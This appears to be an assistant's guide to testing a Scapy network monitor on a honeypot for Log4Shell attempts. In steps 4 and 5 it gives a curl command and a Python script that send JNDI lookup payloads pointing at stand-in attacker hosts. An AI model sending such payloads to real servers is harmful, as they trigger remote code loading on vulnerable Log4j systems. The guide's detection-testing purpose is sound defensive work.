To test if the Scapy script is working, you can follow these steps:

### 1. **Verify Scapy Installation**
Make sure you have installed Scapy. If not, you can install it using:

```bash
pip install scapy
```

### 2. **Modify Network Interface**
Check the network interface on which you want to monitor traffic (for example, `eth0`, `wlan0`, etc.). If you're on a different network interface, update the following line in the script:

```python
interface = 'eth0'
```

To find your network interface, run this command on Linux or macOS:

```bash
ifconfig
```

Or on Windows:

```bash
ipconfig
```

### 3. **Run the Script**
Run the script with `sudo` or administrative privileges to give it permission to access the network interface.

```bash
sudo python3 monitor.py
```

### 4. **Simulate an Exploit Attempt**
To test whether the script can detect a **Log4Shell**-like payload, you can simulate an HTTP request that contains a **JNDI lookup string**.

Here are a few methods to simulate this:

#### a) **Send a cURL Request** (Linux/macOS/Windows)

Open a terminal and send a request to your honeypot’s IP address with a string that simulates a Log4Shell attack:

```bash
curl -H "User-Agent: ${jndi:ldap://attacker.com/a}" http://<your_honeypot_ip>
```

This command will send an HTTP request with the malicious payload in the `User-Agent` header, which your Scapy script should detect.

#### b) **Using a Python Script to Simulate HTTP Request**:

Here’s a simple Python script to simulate an HTTP request with the Log4Shell payload:

```python
import requests

# Target your honeypot or local web server
url = "http://<your_honeypot_ip>"

# Send an HTTP request with a suspicious User-Agent header
headers = {
    "User-Agent": "${jndi:ldap://malicious-server.com/a}"
}
response = requests.get(url, headers=headers)

print(f"Status Code: {response.status_code}")
```

Replace `<your_honeypot_ip>` with the IP address where your honeypot is running.

### 5. **Check for Detection**
If the Scapy script is working correctly, it should detect the suspicious JNDI lookup pattern and print an alert similar to:

```
[ALERT] Potential Log4Shell exploit attempt detected!
Source IP: 192.168.1.100
Destination IP: 192.168.1.10
Payload: GET / HTTP/1.1
Host: <your_honeypot_ip>
User-Agent: ${jndi:ldap://malicious-server.com/a}
...
```

### Troubleshooting Tips:
- **Network Interface**: Make sure you're sniffing on the correct network interface. Use `ifconfig` or `ipconfig` to verify the active interface on your system.
- **Permissions**: Scapy requires root or administrator privileges to sniff network traffic. Ensure that you're running the script with `sudo` (Linux/macOS) or as an administrator (Windows).
- **Traffic Generation**: Ensure that you are actually generating network traffic toward the honeypot to test the detection. Without traffic, the script will not have anything to detect.

Once you’ve simulated the exploit and the script successfully detects it, you’ll know that your monitoring setup works!
